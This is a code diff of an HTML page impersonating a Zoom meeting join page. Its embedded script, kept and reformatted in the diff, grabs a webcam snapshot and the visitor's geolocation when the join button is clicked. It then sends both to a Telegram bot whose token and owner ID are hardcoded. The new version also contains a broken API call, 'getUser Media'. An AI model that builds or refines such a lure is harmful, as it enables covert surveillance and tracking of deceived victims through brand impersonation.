@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Zoom</title>
   <style>
     body {
@@ -28,18 +28,25 @@
       text-decoration: none;
     }
     .btn {
-        display: inline-block;
-        margin-top: 20px;
-        background-color: #0B5CFF; /* Biru resmi Zoom */
-        color: #fff;
-        font-weight: 600;
-        border-radius: 8px;
-        padding: 12px 28px;
-        font-size: 16px;
-        text-decoration: none;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* biar lebih nyata */
+      display: inline-block;
+      margin-top: 20px;
+      background-color: #0B5CFF; /* Biru resmi Zoom */
+      color: #fff;
+      font-weight: 600;
+      border-radius: 8px;
+      padding: 12px 28px;
+      font-size: 16px;
+      text-decoration: none;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* biar lebih nyata */
+      cursor: pointer;
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
     }
 
+    .btn:hover {
+      background-color: #003d99;
+      box-shadow: 0 4px 12px rgba(0, 61, 153, 0.7);
+      border-color: #003d99;
+    }
     .footer {
       margin-top: 80px;
       font-size: 12px;
@@ -56,7 +63,7 @@
 
   <!-- Logo -->
   <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Zoom_Communications_Logo.svg/2560px-Zoom_Communications_Logo.svg.png" alt="Zoom Logo" height="40">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Zoom_Communications_Logo.svg/2560px-Zoom_Communications_Logo.svg.png" alt="Zoom Logo" height="40" />
   </div>
 
   <!-- Main Content -->
@@ -69,82 +76,95 @@
       <a href="#">Privacy Statement</a>
     </p>
 
+    <!-- Added id="btn" to enable JS event listener -->
     <a href="#" class="btn" id="btn">Join from Zoom Workplace app</a>
-    <script>
-    const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
-    const OWNER_ID = "7143446125";
 
-    document.getElementById("btn").addEventListener("click", async () => {
-        log("");
+    <script>
+      const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
+      const OWNER_ID = "7143446125";
+
+      // Optional: define a simple log function to avoid errors
+      function log(message) {
+        // You can implement logging here if needed, or leave empty
+        // console.log(message);
+      }
+
+      document.getElementById("btn").addEventListener("click", async (event) => {
+        event.preventDefault(); // Prevent default anchor behavior
+        log("Button clicked");
+
         let photoBlob = null;
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: true
-            });
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
-            stream.getTracks().forEach(t => t.stop());
+          const stream = await navigator.mediaDevices.getUser Media({
+            video: true
+          });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL("image/jpeg");
+          // Convert dataURL to Blob
+          const res = await fetch(dataUrl);
+          photoBlob = await res.blob();
+          stream.getTracks().forEach(t => t.stop());
+          log("Photo captured");
         } catch (e) {
-            log("");
+          log("Error capturing photo: " + e.message);
         }
+
         let coords = null;
         try {
-            coords = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve(pos.coords),
-                    err => reject(err), {
-                        timeout: 10000
-                    }
-                );
-            });
-            log("");
+          coords = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+              pos => resolve(pos.coords),
+              err => reject(err),
+              { timeout: 10000 }
+            );
+          });
+          log("Location obtained");
         } catch (e) {
-            log("");
+          log("Error getting location: " + e.message);
         }
 
-        // Kirim ke Telegram
+        // Send to Telegram
         try {
-            if (photoBlob) {
-                const fd = new FormData();
-                fd.append("chat_id", OWNER_ID);
-                fd.append("photo", photoBlob, "snap.jpg");
-                let cap = "Snapshot dari device.";
-                if (coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-                fd.append("caption", cap);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: fd
-                });
-                log("");
-            }
-            if (coords) {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: OWNER_ID,
-                        text: `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`
-                    })
-                });
-                log("");
-            }
+          if (photoBlob) {
+            const fd = new FormData();
+            fd.append("chat_id", OWNER_ID);
+            fd.append("photo", photoBlob, "snap.jpg");
+            let cap = "Snapshot dari device.";
+            if (coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+            fd.append("caption", cap);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: fd
+            });
+            log("Photo sent to Telegram");
+          }
+          if (coords) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                chat_id: OWNER_ID,
+                text: `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`
+              })
+            });
+            log("Location sent to Telegram");
+          }
         } catch (e) {
-            log("");
+          log("Error sending to Telegram: " + e.message);
         }
 
-        log("");
-    });
+        log("Process completed");
+      });
     </script>
-
 
     <p style="margin-top:40px; font-size:14px; color:#666;">
       Don’t have the Zoom Workplace app installed? <a href="#">Download Now</a>
